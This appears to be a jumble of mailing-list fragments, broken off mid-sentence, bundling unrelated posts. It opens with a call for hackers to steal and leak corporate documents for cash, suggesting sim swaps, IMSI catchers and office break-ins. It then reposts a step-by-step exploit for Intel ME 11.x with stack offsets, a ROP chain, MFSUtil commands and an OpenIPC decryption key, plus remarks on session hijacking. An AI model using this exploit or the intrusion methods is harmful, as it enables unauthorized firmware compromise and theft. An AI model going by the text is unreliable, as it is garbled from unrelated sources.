d in the hacking. Needless to say, a complete leak of the documents and int=
ernal communications of any of these companies will be a benefit for societ=
y that exceeds those one hundred thousand, but I am not trying to enrich an=
yone. I just want to provide enough funds so that hackers can earn a decent=
 living doing a good job. Due to time constraints and safety considerations=
 I will not open the material, nor inspect it for myself, but I will read w=
hat the press says about it once it has been published, and I will make an =
estimate of the public interest from there. My contact information is at th=
e end of the guide mentioned above [4].
How you get the material is your thing. You can use the traditional hacking=
 techniques outlined in this guide and the previous one [4]. You could do a=
 sim swap [5] on a corrupt businessman or politician, and then download his=
 emails and backups from the cloud. You can order an IMSI catcher from alib=
aba and use it outside its offices. You can do some war-driving (the old wa=
y or the new [6]). You may be a person within your organizations that alrea=
dy has access. You can opt for a low-tech old-school style like in [7] and =
[8], and simply sneak into their offices. Whatever works for you.

Built by the enemy to enclose ideas
enclosing companions to silence war cries

where the human being becomes more violent
It is the reflection of society, repressive and prison

 Exploiting Intel=E2=80=99s Management Engine =E2=80=93 Part 2: Enabling Red=
 JTAG Unlock on Intel ME 11.x (INTEL-SA-00086)
Posted on November 14, 2019
Hey there, friend! Long time no see! Actually.. not really, I=E2=80=99m sta=
rting this article right after I posted Part 1: Understanding PT=E2=80=
=99s TXE PoC.
If you haven=E2=80=99t read part 1, then you should do that now, because th=
is is just a continuation of my previous post, but because of its length, I=
 decided to split it into multiple parts.
Now that we know how the existing TXE exploit works, we need to port it to =
ME 11.x. Unfortunately, the systracer method is very difficult to reproduce=
 because you only control a few bits in the return address and being able t=
o change the return address into one that is valid, doesn=E2=80=99t cause a=
 crash, and returns properly into our ROP is very difficult. In my case, I =
had actually started porting it to ME 11.0.0.1180 which didn=E2=80=99t even=
 set the systracer values, so I had no choice but to look at the exploit ex=
plained in the BlackHat Europe 2017 presentation : Using the memcpy method.
Gathering the necessary information
I will spare you the details of showing you any reversed code or assembly a=
nd just get to the point.
    The MFS partition uses chunks of 64 bytes each
    The MFS read function reads to a temporary buffer of 1024 bytes and if =
chunks are sequential in the file system, it can read multiple chunks (up t=
o 16) at once
    The "/home/mca/eom" file in the MFS=E2=80=99s fitc.cfg file needs to co=
ntain one byte with value 0x00
    DCI needs to be activated using the CPU straps in the IFD (Intel Flash =
    There=E2=80=99s an alternate execution route that could happen if there=
 is a home partition in the MFS (file index 8), it could cause the exploit =
not to work, so make sure the MFS partition does not have a file in index 8=
 (more on that later).
    Because of the above, you need to enable the HAP bit. If the ME boots c=
ompletely (i.e: not disabled via HAP), then the home partition gets created=
 in MFS and the exploit stops working. the ME crashes instead and the machi=
ne becomes unbootable.
    The shared memory context structure is at offset 0x68 of the syslib con=
text, and within it, at offset 0x28 is the pointer to the shared memory des=
criptors and at offset 0x2C is the number of valid shared memory descriptor=
    Note that the shared memory context is within the syslib context, not m=
erely a pointer to it, so the pointer to the shared memory descriptors is a=
t offset 0x90 (0x68 + 0x28) of the syslib context
    The shared memory block descriptors are of size 0x14 and of the format =
 where the flags being set to 0x11 w=
orks fine (I believe bit 0 is =E2=80=98in use=E2=80=99, not sure about bit =
4, but it was set in the shmem of init_trace_hub) and the thread_id is set =
to zero in our case.
To help with the last points about the shared memory descriptors, here=
=E2=80=99s a slightly modified graphic from one of the slides of the BlackH=
at Europe 2017 presentation :
Slide 43 of =E2=80=9CHow to Hack a Turned-Off Computer, or Running Unsigned=
 Code in Intel Management Engine=E2=80=9D
My old Librem 13 is a skylake machine and I=E2=80=99ve used it for all my t=
ests as it is very easy to flash and test on. It has ME version 11.0.18.100=
2 (if anyone wants to follow along).
Now, the first thing we need to do is figure out where our stack is. To do =
that, we open the BUP module in IDA, and check the very first function that=
 gets called from the entrypoint (before the main).
That function will initialize the syslib context, the TLS structure and the=
 stack, therefore, we=E2=80=99ll find in it the hardcoded values of all tho=
se things. Here=E2=80=99s what it looks like :
Now I know that my stack address for ME 11.0.18.1002 is 0x60000 and the sys=
lib context is at 0x82CAC with a size of 0x218 (not useful information for =
What I will do is to go to the entry point and follow along the push/pop/ca=
ll/ret calls in order to get the full picture of the stack all the way to t=
he memcpy that interests me, like I did in my previous article. Here=
=E2=80=99s the result :

The ct_data buffer is at address 0x5FC80, which means it still is at offset=
 0x380 from the top of the stack. We can also see that the return address t=
o the memcpy call is at 0x5F678 which means it's at an offset of 0x988 from=
 the top of the stack. This is the address/value that we want to overwrite =
with our exploit. If we can replace that return address by one that points =
to our ROP, then we have succeeded.
What else do we need? It looks like that's it, right ? We set our ROPs to d=
o whatever we want (more on that later), fill the rest of the file up to 0x=
380 with our syslib context such that we have a valid number of shared memo=
ry descriptor (on Apollolake, our shared memory block id was '2', but we wo=
n't take any chances, we'll use 20!), and have all our shared memory descri=
ptors point to the same target address, then we set our TLS structure at th=
e end of those 0x380 bytes which itself points the syslib context within ou=
r file.
Once the last chunk in the file is read, the TLS is replaced and the syslib=
 context also is. This means that the next chunk that gets read and copied =
is the one that will overwrite our return address, this means that we'll ad=
d an additional chunk to the file (64 bytes) with the value that we want to=
 write to the return address. Considering that the value we write will be r=
eturned to, it means that we can put our ROPs directly there, but we'll jus=
t do the pop esp; ret ROP not the full ones.
The MFS filesystem
Yes, that is technically all that we need, but there are a couple of proble=
ms here. The first is that we don't control the MFS file. If we use Intel's=
 tool to add the TraceHub Configuration file, the file will be contiguous i=
n the MFS partition which means it will be read in one shot since we've alr=
eady established that the ME optimizes its MFS reads and can read up to 16 =
chunks in one operation. The solution to that would be to make sure that th=
e chunks are not in sequential order and it means we need to manipulate the=
 MFS file on our own.
For that, we need to understand how the MFS filesystem works. Thankfully, D=
mitry Sklyarov (also from Positive Technologies) had his own presentation d=
uring the the same BlackHat Europe 2017 conference that explains how the ME=
 File System works internally. You can read all about it in his slides. Mor=
eover, he has released a small tool called parseMFS which can be used to ex=
tract files from an MFS partition.
Unfortunately, parseMFS does not let you add or manipulate the MFS partitio=
n in any way, so I wrote my own tool, MFSUtil which uses the knowledge shar=
ed by Dmitry in his presentation and lets us manipulate the MFS partition a=
ny way we want. More specifically, it lets us :
    Replace the "/home/bup/ct" file directly with our exploit.
    Replace the "/home/mca/eom" so its content is 0 if needed.
    'De-optimize' the file so the chunks are never in sequence, forcing the=
 ME to read each chunk separately.
    Align the file on start/end chunk boundaries
That last one is because, while we're lucky and 0x380 ends on a chunk bound=
ary, it will not always be the case (for example, ME 11.0.0.1180 has the ct=
_data at offset 0x384), so you would need the ct file to be aligned in such=
 a way that the last byte ends on the last byte of a chunk, so when that ch=
unk is read, the entire TLS structure is replaced, not just part of it, and=
 the small ROP we write to replace the memcpy's return address is indeed th=
e one that gets written, rather than the last bytes of the TLS structure.
I have now released the MFSUtil tool on github (and wow, my initial commit =
of it was in April 2018, I hadn't realized that it's actually been more tha=
n a year that I've started working on this), and if you look at the example=
s directory, you'll find the script that I use to generate a new coreboot i=
mage with an exploited ct file, but it basically does this :
# Extract file number 7 (fitc.cfg)
../MFSUtil.py -m MFS.part -x -i 7 -o 7.cfg
# Remove the /home/bup/ct file from it
../MFSUtil.py -c 7.cfg -r -f /home/bup/ct -o 7.cfg.noct
# Add the new ct file as /home/bup/ct
../MFSUtil.py -c 7.cfg.noct --add ct --alignment 2 --mode ' ---rwxr-----' -=
-opt '?--F' --uid 3 --gid 351 -f /home/bup/ct -o fitc.cfg
# Delete file id 8 (home) from the MFS partition
../MFSUtil.py -m MFS.part -r -i 8 -o MFS.no8
# Delete file id 7 (fitc.cfg) from the MFS partition
../MFSUtil.py -m MFS.no8 -r -i 7 -o MFS.no7
# Add the modified fitc.cfg into the MFS partition
../MFSUtil.py -m MFS.no7 -a fitc.cfg --deoptimize -i 7 -o MFS.new
I'm not going to waste my time here explaining how the file system works or=
 how the tool works. Dmitry explained the inner workings of the MFS partiti=
on very well in his presentation at BlackHat Europe 2017, and you can use t=
he --help option of the tool (or read its README file) to figure out how to=
 use it. The important part is that this does everything you need to make s=
ure the ct file is in the MFS partition in the proper way so that the explo=
it would work.
ROPs: Return Oriented Programming
This is where it gets a little bit more interesting. The ROPs used are goin=
g to be very simple, we need to enable red unlock and do an infinite loop, =
oh and find pop esp; ret.
If you're not familiar with Return Oriented Programming, well.. this post i=
s probably too in-depth for you already and I'm not going to do a tutorial =
on ROP (maybe some other time), but the basic premise is that if you can't =
write your own code to be executed, then you can use the existing code and =
create a fake stack where a few instructions at the end of an existing/legi=
timate function are executed then the function returns to the next instruct=
ions you want to execute. By chaining all these "ROP Gadgets" you can make =
it do whatever you want.
If you've seen my analysis of the ROPs from the previous article, then you'=
ve seen that for TXE, they do this :
side_band_mapping(0x706a8, 0x100);
put_sel_word(0x19F, 0, 0x1010); // Sets 0x19F:0 to 0x1010
side_band_mapping(0x70684, 0x100);
put_sel_word(0x19F, 0x8400, 3); // Sets 0x19F:8400 to 3
But there are two things of interests here, first, we don't need to enable =
DCI because if you've read the BlackHat Europe 2017 presentation from Maxim=
 Goryachi and Mark Ermolov, you know that you need to have DCI enabled befo=
re you execute the exploit, otherwise, the DfX Aggregator consent register =
will be locked, so we enable DCI using the CPU strap in the Intel Flash Des=
criptor. So there is only one thing we need to do : set the DfX-Agg persona=
lity value to 3. Now as you've seen above, there are a few magic numbers he=
re, what's 0x70684 and why segment 0x19F and offset 0x8400. To explain that=
, let's talk a bit about the Sideband interface
IOSF Sideband
The good kind of IOSF
I won't go too in depth in explanation about the IOSF Sideband as I will ex=
plore it much more in depth in part 3 of this series of articles. No, the I=
OSF is not the International Otter Survival Fund, though that's the first r=
esult Google gives me and it's a lot cuter than Intel's version of that acr=
onym. IOSF stands for Intel On-Chip System Fabric, and I think it's just a =
fancy word for saying "a hub that everything connects to".
The way I understand it (and maybe I'm wrong on some level, if that's the c=
ase, I'm blaming it on my attempts to simplify the explanation, but clearly=
 I knew what I was talking about... ahumm.. ), is that Intel's optimization=
s of their chips has led them to use an architecture where you have every I=
P core connected to the IOSF (remember my tutorial on how computers work fr=
om last month? think of the full adder as an IP core, and the ALU as connec=
ting multiple IP cores together, only in this case, we're talking about the=
 PCH chipset and each IP core is going to be a device, such as USB controll=
er, SATA controller, Graphics card, Ethernet controller, PCIe controller, G=
PIO controllers, DCI controller, DfX Aggregator, SPI, Audio, etc..). So yea=
h, every IP core is connected to the IOSF and from there, everything can co=
mmunicate with everything, as long as they are authorized to do so.
So when the CPU wants to talk to the USB controller, it will talk to the PC=
H via the PCI controller and the PCI bridge will talk to the USB controller=
 via the IOSF and forward the commands over. The sideband is a way to commu=
nicate with a device directly by passing through the IOSF and telling it wh=
ich device we want to talk to and how, rather than using whatever bus was d=
esigned to communicate with the device.
The magic value 0x70684 you saw before can actually be divided into these a=
ttributes :
    bit 29: 0 - not sure...
    bit 28: 0 - posted
    bits 27-24: 0 - BAR
    bits 23-16: 0x07 - Write opcode
    bits 15-8: 0x06 - Read opcode
    bits 7-0: 0x84 - Sideband Port ID
Things I've learned about it : The read opcode is always an even number, th=
e write opcode is the same +1 (read 0, write 1, read 2, write 3, etc.. ), a=
lso these are the read/write opcodes that I know :
    Opcode 0 : Read/Write BAR
    Opcode 2 : Unused?
    Opcode 4 : Read/Write PCI Configuration Space
    Opcode 6 : Read/Write Private Configuration Space
Now finding the Sideband Port ID, that's the interesting bit. It's easy to =
find some for skylake, just grab the 100-series PCH datasheet volume 1 from=
 Intel, and look at the last two pages on the Primary to Sideband Bridge ch=
apter, you'll find them listed :
Some Sideband Port IDs
There are more, and you can see 0xB8 is the port ID for DCI though we don't=
 need it. The problem is that the DfX-Agg device is not listed in the datas=
heet because it's not a 'publicly available device' (it's only meant for th=
e ME to poke at) and we need to find it on our own by looking at the BUP as=
sembly. I won't bore you with the details (mostly because quite honestly, I=
 don't remember how I found it) but the Port ID is 0xB7.
Actually, the BUP module has the DfX-Agg device already mapped to MMIO so i=
t can use it, so by looking at the init scripts that get executed before bu=
p_init_trace_hub, I can find the function bup_init_dci which is really easy=
 to find (and thankfully, I've seen what it looks like already in slide 27 =
of the 34th CCC presentation). The function looks pretty much like this :
void bup_init_dci() {
  int pch_strap0;
  bup_get_pch_straps(0, &pch_strap0);
  if (!(pch_strap0 & 2))
    bup_disable_dci();
  else
    bup_enable_dci();
  if (bup_is_dci_enabled())
    bup_set_dfx_agg_consent();
  else
    bup_lock_dfx_agg();
  // Stack Guard
And then, looking at the bup_set_dfx_agg_consent function, it looks like th=
is :
void bup_set_dfx_agg_consent() {
  int consent =3D get_segment_dword(0x10F, 4); // Read 32 bits from 0x10F:4
  set_segment_dword(0x10f, 4, consent | 1); // Write to 0x10F:4
Well, that's easy, if we want to write to the DfX aggregator, we don't nece=
ssarily need to write to the sideband port directly, we can just write to t=
he MMIO in segment 0x10F and it should do the work for us. Note that MMIO i=
s simply mapped to the DfX-Agg device via the sideband, and I think that I =
had found the Sideband Port ID by looking at how the sideband mappings for =
the MMIO ranges get setup.
Back to ROP
So, now back to our ROP, all we would need to do, is to call this function =
using a ROP set_segment_dword(0x10F, 0, 3) that should be easy!
To find which ROPs we can use, and find the gadgets we want, we can use thi=
s very useful tool called Ropper. Using Ropper, I was able to search for th=
e address of the pop esp; ret and the jmp $ instruction for the infinite lo=
op as well as anything else I might need. I end up with this little ROP :
    # Write dfx personality =3D 0x3
    rops +=3D rop(0x11B9)=09=09=09# set_selector_dword
    rops +=3D rop(0x44EA3) =09=09# infinite_loop
    rops +=3D rop(0x10F)=09 =09=09# param 1 - selector
    rops +=3D rop(0)=09=09=09# param 2 - offset
    rops +=3D rop(0x3)=09=09=09# param 3 - value
Once that's done, I can give it a try, and... yes, yes, that's it, it worke=
d, even though you can't really know it yet because I have no way of actual=
ly debugging the ME because the Intel IPC framework that Intel System Studi=
o provides, does not (obviously) support the ME core in its JTAG configurat=
ion. I'll get to that in a minute, but yes, that is enough to get it workin=
I have later improved the ROPs to actually write the original syslib contex=
t to the TLS structure, then reset the stack to what it should be so the in=
it scripts can continue executing and the main finish its thing, so that af=
ter the exploit runs, I can still turn on the computer (the same as PT did =
with the CPU Bringup changes for TXE).
In summary :
    Find the Stack address and Syslib context address from the first call i=
n the BUP entry function.
    Follow all the push/pop/call/ret to build a map of what the stack shoul=
d look like
    Find the offset of the CT data in the stack
    Find the address of the return address of the memcpy call
    Build your CT file so you have :
        ROPs to set RED level to the DfX-Aggregator and restore the stack
        Syslib context pointing to shared memory descriptors
        Shared memory descriptors (Don't forget, your buffer size needs to =
be your file size + 0x40 since you have one extra chunk at the end, and you=
r address needs to be the target_address - offset)
        TLS data pointing to the custom syslib context
        Extra chunk at the end of the file that has the ROP with pop esp; r=
et and the pointer to your actual ROP data at the start of the file.
    Add your custom CT file to the MFS partition using MFSUtil, making sure=
 it aligns with end of chunks and does not use sequential chunks in the cha=
I've uploaded my script to generate the CT file for ME 11 in a fork of PT's=
 TXE POC repository. It has the offsets and ROPs for both Skylake (ME 11.0.=
18.1002) and Kabylake (ME 11.6.0.1126). It is currently in the me11 branch.=
 I don't know if that branch gets deleted eventually and it goes into maste=
r, or it gets merged upstream officially (it's not TXE anymore, so maybe no=
t?), regardless, here's the repository : OpenIPC is the last step of this adventure! It's a Python library and tool =
and I don't know what else, but it's basically what we use to communicate w=
ith the ME on the machine. Positive Technologies repository explains well h=
ow to find the decryption key for the OpenIPC configuration files and how t=
o decrypt them.
The second step is to apply a patch to the configuration files to add suppo=
rt for the ME.
The problem is that on Apollolake, the configuration file has every JTAG TA=
P (Test-Access Port) defined while the Skylake definition is empty (well, i=
t only supports actual CPU cores but none of the other internal devices).
Figuring out the XML format of those files, how they are used, how JTAG its=
elf works and everything else is a lesson for another day (probably never b=
ecause I was in a daze trying to figure it out and I mostly banged on my ke=
yboard like a monkey until something worked, then I erased all that knowled=
ge from my brain because I was disgusted).
The way that JTAG works (more or less) is that you have a topology/hierarch=
y, you have a device that has children, and those children can have their o=
wn children, and if you don't know the full path to a device, you can't tal=
k to it. If you make a mistake in the 'index' of those children in the path=
, then you'll be talking to something else. Thankfully, it's not very stric=
t, so you can just say "the 3rd child of the 2nd child of the 4th child" an=
d you don't need to specify what each of those in the link are, so if you m=
ake a mistake, or if the first device only has 1 child, then you'll just be=
 talking to "the wrong child of the wrong child of the wrong child" rather =
than be unable to communicate. At least, I think that's how it works... I'm=
 not entirely sure that's how it works and I entirely don't care, what's im=
portant though is that you don't need to say "I want to talk to device with=
 ID x", instead you say "I want to talk to device 3->2->4" and then you ask=
 it for its ID.
That topology is defined in an XML file, and I wrote a script that generate=
d an XML file that basically brute forces every possibility. So for each de=
vice, I define 8 subdevices and for each of those subdevices, I define 8 ot=
her subdevices, up to a depth of 4 or I don't even remember how many. So af=
ter spending days trying to figure this out, I just wrote this script :
def genTaps(max, depth=3D0, max_depth=3D1, parent=3D"SPT_TAP"):
    res =3D ""
    for i in xrange(0, max, 2):
        name =3D "%s_%s" % (parent, i)
        res +=3D ('  ' * depth + '\n' % (name, i, max, i, max))
        if depth + 1 < max_depth:
            res +=3D genTaps(max, depth + 1, max_depth, name)
        res +=3D ('  ' * depth + '\n')
    return res
    # ProductInfo.xml needs this line added :
    #     # Or whatever parent/prefix you use for the initial call set in TapName
Then I called it and generated a new OpenIPC/Data/Xml/SPT/TapNetworks.LP.xm=
l file, added a line in the ProductInfo.xml file to tell it that there is a=
 'Box' node with all those TAP devices, then I ran OpenIPC again. Yeay, it =
accepts the config file (after the Nth attempt of course, let's ignore that=
The tap networks file is now 500KB and has this huge topology of about 3000=
 devices, most of which did not exist and would yield in an error when Open=
IPC tries to scan their idcode, and would therefore not add them to the fin=
al device list (thinking they are just powered off), but once it's done, it=
 should technically list every device that is actually available on the JTA=
G chain.
Finally, I run this little code in the IPC python console :
def displayValidIdcodes(prefix=3D""):
    for d in ipc.devs:
        if d.name.startswith(prefix):
            idcode =3D d.idcode()
            proc_id =3D d.irdrscan(0x2, 32)
            if proc_id !=3D 0:
                idcode +=3D " (" + proc_id.ToHex() + ")"
            print("%s : %s" % (d.name, idcode))
While looking at all the configuration files from various platforms and try=
ing to understand the schema, I noticed that the core processors have two I=
D codes. The first one using the IR (Instruction Register I think?) scan co=
de 0xC let every other device, which gives us the actual Idcode of the devi=
ce, but using the IR scan code 0x2, it gives us the 'processor type' or som=
ething like that..
Once I run the above script, it gives me the list of all devices (just one)=
 that have a non zero processor ID, and that reveals the CSME core! With th=
at, I know its position in the topology, and I can clean up the xml file to=
 leave only that device and give it a proper name and the proper configurat=
ion so I can debug into it, etc...
=09  Oh by the way, this is on OpenIPC_1.1917.3733.100 and the decryption key is=
 1245caa98aefede38f3b2dcfc93dabfd so we can just decrypt the OpenIPC files =
with :
python config_decryptor.py -k 1245caa98aefede38f3b2dcfc93dabfd -p C:\Intel\=
It would probably be a different version of OpenIPC if you use the latest v=
ersion of Intel System Studio (I believe I had version 2019.4) and therefor=
e a different decryption key. You can find your own easily using the instru=
ctions that PT have released along with their POC repository.
There is one final problem that still needs to be resolved. Whenever I open=
 OpenIPC with the machine turned on, it will fail because of some conflict =
in the configuration between the ME core and main CPU, so I have to connect=
 to the machine before I power it on, connect with OpenIPC, then turn the m=
achine on, and it works. I'm sure that some smart people can figure out the=
 right XML configuration that would allow me to debug both the ME and the C=
PU cores at the same time, but I don't really need that so I didn't waste a=
ny of my time trying to achieve that. Note that the TXE PoC for Apollolake =
suffers from the same problem and the patches to OpenIPC that PT released r=
emove the CPU cores to prevent that conflict from happening.
Regardless, the diff for the config files is added to my repository IntelTX=
E-PoC fork, and just make sure you launch OpenIPC before powering on the ma=
in CPU and you should be fine.
And that's it! Congratulations, you can now debug the ME 11.x on a Skylake =
or Kabylake machine!
CSME debugged on Skylake
That's the end of the story for today. Next time, I'll tell you about how I=
 wrote a quick USB controller for the CSE and how I made the CSME disrupt t=
he USB and SATA controllers while the OS was booted, making all USB/SATA dr=
ives become inaccessible!
While in this post, you saw the release of the MFSUtil project and the ME 1=
1.x port of the IntelTXE PoC, in the next one (either tomorrow or Friday), =
I'll release a lot of the tools and scripts I used to work with JTAG, so yo=
u can do more easily poke at the ME processor without fighting against the =
limitation of the OpenIPC library.

h. Well, that's it, it can be done.
they all missed the first question: what's your threat model?
"anonymity" has been used to describe a transparent web proxy and a datagra=
m overlay protocol, and everything in between.
"It is straight forward to move on from secp256k1 to other"
this is actually not trivial! downgrade attacks are a real threat vector, s=
eamless key migration technically challenging, deprecating legacy cipher su=
ites in decentralized systems a significant challenge...

- exposing IPv4 betrays anonymity (without additional protections)
- IPv4 addresses are a very poor sybil defense.
- IPv6 ORCHID addresses (non-routable virtual addrs) via Tor overlay would =
be a significant improvement! E.g. - "This is the only anonymity issue" is not reassuring when this issue is a=

y Intel CSME firmware module would not jeopardize the root cryptographic ke=
y (Chipset Key), but only the specific functions of that particular module.=
one root / trust anchor here, the Chipset Key. being able to manipulate thi=
s key is equivalent to having the private key, to sign malicious code in CS=
ME context. so while the system is designed to robustly protect the Chipset=
 Key, exploitation in early ROM compromises this Chipset Key root of trust.
- "Unfortunately, no security system is perfect. Like all security architec=
tures, Intel's had a weakness: the boot ROM, in this case. An early-stage v=
ulnerability in ROM enables control over reading of the Chipset Key and gen=
eration of all other encryption keys."
yup, early exploit in boot ROM lets you control Chipset key, and by extensi=
on, all of the other keys generated from this compromised root of trust, in=
cluding Soft TPM keys, content protection keys, etc.
- "One of these keys is for the Integrity Control Value Blob (ICVB). With t=
his key, attackers can forge the code of any Intel CSME firmware module in =
a way that authenticity checks cannot detect. This is functionally equivale=
nt to a breach of the private key for the Intel CSME firmware digital signa=
ture, but limited to a specific platform."
what is meant by limited to a specific platform, is that this exploit is lo=
w level and platform specific. to attack another platform, you'd need to ad=
just exploit accordingly. they don't state what other platforms, if any, th=
ey've successfully exploited via this same vulnerability.
- "We will provide more technical details in a full-length white paper to b=
e published soon."
will be fun to see :)

On Saturday, May 30, 2020 5:49 PM, Faux Dameron =
i asked a similar question around a decade ago. i don't have a definitive a=
nswer, but some opinions...
there is no one causative factor; many combined:
- early progress in privacy tech leading to a languishing (or at least a de=
cline). "we won the crypto wars!" (hah :)
- sustainability; there was insufficient passionate new blood to sustain wh=
at was "the cypherpunks" of that era. or said another way, the passionate c=
oders of future privacy tech moved in circles that overlapped, but were not=
 defined by, the cypherpunks.
- centralization; it is a strong attractor! when you've got development idi=
oms and norms all built around github and package repos and "free" services=
, each somewhat or very opposed to decentralized cypherpunks ethos, the res=
ult is a drain away from core cypherpunks (if there is a thing) into other =
endeavors. this is pervasive and persistent.
- sophistication; the state of the art moved on from the realm of amateur p=
ractitioner to applied graduate level computer science and information theo=
ry.  the incremental gains in privacy effectiveness required increasingly c=
omplicated constructs. the ideal constructions with severe performance cons=
traints suffered and died due to lack of adoption. usability and privacy ar=
e complicated in ways we continue to discover - requiring mastery of many d=
omains to implement effectively.
i had hope the Snowden leaks would revive a passionate cypherpunks groundsw=
ell. in one sense, it did: end-to-end secure open source tech is widely ava=
ilable, most of the internet is encrypted - it's hard to overstate how monu=
mental this is! but it is also clear this progress was made outside of what=
ever "cypherpunks" is today.
if that didn't do it? perhaps email lists are simply too archaic for modern=
 popularity :)
if slack remade IRC, what does a  shittier, web'ified maillist look like? (=

agreed. but try to convince everyone of that!

use an LD_PRELOAD hack to force mlock() on the apps you want to keep intera=
If you have the sources for the program, add a command-line option so that =
the program calls mlockall(MCL_CURRENT | MCL_FUTURE) at some point. That lo=
cks it in memory.
If you want to control the address spaces the kernel loads the program into=
, you need to delve into kernel internals. Most likely, there is no reason =
to do so; only people with really funky hardware would.
If you don't have the sources, or don't want to recompile the program, then=
 you can create a dynamic library that executes the command, and inject it =
into the process via LD_PRELOAD.
Save the following as lockall.c:
     static void wrerr(const char *p)
    if (p) {
        const char *q =3D p + strlen(p);
        ssize_t     n;
        while (p < q) {
            n =3D write(STDERR_FILENO, p, (size_t)(q - p));
            if (n > 0)
                p +=3D n;
            else
            if (n !=3D -1 || errno !=3D EINTR)
                return;
        }
    }
static void init(void) __attribute__((constructor));
static void init(void)
    int saved_errno =3D errno;
    if (mlockall(MCL_CURRENT | MCL_FUTURE) =3D=3D -1) {
        const char *errmsg =3D strerror(errno);
        wrerr("Cannot lock all memory: ");
        wrerr(errmsg);
        wrerr(".\n");
        exit(127);
    } else
        wrerr("All memory locked.\n");
    errno =3D saved_errno;
Compile it to a dynamic library liblockall.so using
gcc -Wall -O2 -fPIC -shared lockall.c -Wl,-soname,liblockall.so -o liblocka=
Install the library somewhere typical, for example
sudo install -o 0 -g 0 -m 0664 liblockall.so /usr/lib/
so you can run any binary, and lock it into memory, using
LD_PRELOAD=3Dliblockall.so binary arguments..
If you install the library somewhere else (not listed in /etc/ld.so.conf), =
you'll need to specify path to the library, like
LD_PRELOAD=3D/usr/lib/liblockall.so binary arguments..
Typically, you'll see the message Cannot lock all memory: Cannot allocate m=
emory. printed by the interposed library, when running commands as a normal=
 user. (The superuser, or root, typically has no such limit.) This is becau=
se for obvious reasons, most Linux distributions limit the amount of memory=
 an unprivileged user can lock into memory; this is the RLIMIT_MEMLOCK reso=
urce limit. Run ulimit -l to see the per-process resource limits currently =
set (for the current user, obviously).
I suggest you set a suitable limit of how much memory the process can run, =
running e.g. ulimit -l 16384 bash-built-in before executing the (to set the=
 limit to 16384*1024 bytes, or 16 MiB), if running as superuser (root). If =
the process leaks memory, instead of crashing your machine (because it lock=
ed all available memory), the process will die (from SIGSEGV) if it exceeds=
 the limit. That is, you'd start your process using
ulimit -l 16384
LD_PRELOAD=3D/usr/lib/liblockall.so binary arguments..
if using Bash or dash shell.
If running as a dedicated user, most distributions use the pam_limits.so PA=
M module to set the resource limits "automatically". The limits are listed =
either in the /etc/security/limits.conf file, or in a file in the /etc/secu=
rity/limits.d/ subdirectory, using this format; the memlock item specifies =
the amount of memory each process can lock, in units of 1024 bytes. So, if =
your service runs as user mydev, and you wish to allow the user to lock up =
to 16 megabytes =3D 16384*1024 bytes per process, then add line mydev - mem=
lock 16384 into /etc/security/limits.conf or /etc/security/limits.d/mydev.c=
onf, whichever your Linux distribution prefers/suggests.
Prior to PAM, shadow-utils were used to control the resource limits. The me=
mlock resource limit is specified in units of 1024 bytes; a limit of 16 meg=
abytes would be set using M16384. So, if using shadow-utils instead of PAM,=
 adding line mydev M16384 (followed by whatever the other limits you wish t=
o specify) to /etc/limits should do the trick.

quantum level is random. Incalculable, all the way up, all the way down.
fun developments in this regard:

P.S. i recently read about a study showing randomness as key to sensor effi=
cacy in low signal environments. it seems nature has long relied on this te=
chnique of stochastic resonance to amplify capability!
To make a better sensor, just add noise
by Walt Mills, Pennsylvania State University
Adding noise to enhance a weak signal is a sensing phenomenon common in the=
 animal world but unusual in manmade sensors. Now Penn State researchers ha=
ve added a small amount of background noise to enhance very weak signals in=
 a light source too dim to sense.
In contrast to most sensors, for which noise is a problem that should be su=
ppressed, they found that adding just the right amount of background noise =
can actually increase a signal too weak for sensing by normal sensors, to a=
 level that can reach detectability.
Although their sensor, based on a two-dimensional material called molybdenu=
m disulfide, detects light, the same principle can be used to detect other =
signals, and because it requires very little energy and space compared to c=
onventional sensors, could find wide adaptation in the coming Internet of T=
hings (IoT). IoT will deploy tens of millions of sensors to monitor conditi=
ons in the home and factories, and low energy requirements would be a stron=
g bonus.
"This phenomenon is something that is frequently seen in nature," says Sapt=
arshi Das, an assistant professor of engineering science and mechanics. "Fo=
r example, a paddlefish that lives in muddy waters cannot actually find its=
 food, which is a phytoplankton called Daphnia, by sight. The paddlefish ha=
s electroreceptors that can pick up very weak electric signal from the Daph=
nia at up to 50 meters. If you add a little bit of noise, it can find the D=
aphnia at 75 meters or even 100 meters. This ability adds to the evolutiona=
ry success of this animal."
Another interesting example is the jewel beetle, which can detect a forest =
fire at 50 miles distance. The most advanced infrared detector can only det=
ect at 10 to 20 miles. This is due to a phenomenon these animals use called=
 stochastic resonance.
"Stochastic resonance is a phenomenon where a weak signal which is below th=
e detection threshold of a sensor can be detected in the presence of a fini=
te and appropriate amount of noise," according to Akhil Dodda, a graduate s=
tudent in engineering science and mechanics and co-first author on a new pa=
per appearing this week in Nature Communications.
In their paper, the researchers demonstrate the first use of this technique=
 to detect a subthreshold photonic signal.
One possible use being considered is for troops in combat. Army personnel i=
n the field already carry very bulky equipment. It is unfeasible to add the=
 heavy, power-hungry equipment required to enhance a subthreshold signal. T=
heir technique is also applicable in resource-constrained environments or b=
eneath the ocean where people want to monitor very weak signals. It could a=
lso be used in volcanic locations or to monitor earthquakes in time to give=
 an alarm.
"Who would have thought that noise could play a constructive role in signal=
 detection? We have challenged tradition to detect otherwise undetectable s=
ignals with miniscule energy consumption. This can open doors to a totally =
unexplored and ignored field of noise enhanced signal detection," said Aary=
an Oberoi, a graduate student from the Department of Engineering Science an=
d Mechanics and co-first author on the paper.
Their next step is to demonstrate this technique on a silicon photodiode, w=
hich would make the device very scalable. Any state-of-the art sensor can b=
e enhanced by this concept, Das says.

that you have access to your phone before allowing you to change all your p=

note that you don't need to change passwords to accounts to be able to use =
them. in fact, changing passwords usually requires re-authentication, but e=
xtending a session indefinitely is free! :)
this is the dirty little secret in infosec: authorized session life cycle i=
s almost always too lenient and too long.  for example, many services don't=
 even bind a session to an IP, so session jacking you across the globe thro=
ws up no issues.
you can have sessions that don't expire upon password change - you must ins=
tead go through a separate step to kill existing sessions!
you can have hijacked sessions that simply renew, indefinitely, keep an act=
ive connection to your accounts for days, months, years (!!) without ever h=
aving to enter credentials.
most of the time this is laziness on behalf of service provider. even the b=
ig ones.  sometimes usability is given priority over security - can't cause=
 an inconvenience for users!  they won't get hacked...
end result: most services handle sessions sloppily; caveat emptor.

SET THE FIRSTand last books in Cory Doctorow=E2=80=99s epic, three-bookLitt=

THE FIRST PERSONto tell me aboutLittle Brotherwas John Gilmore, cofounder o=

By then, in fact,Little Brotherwas already a best seller and was quickly be=

of style. At times it seems to even flirt with defeatism, conceding that al=
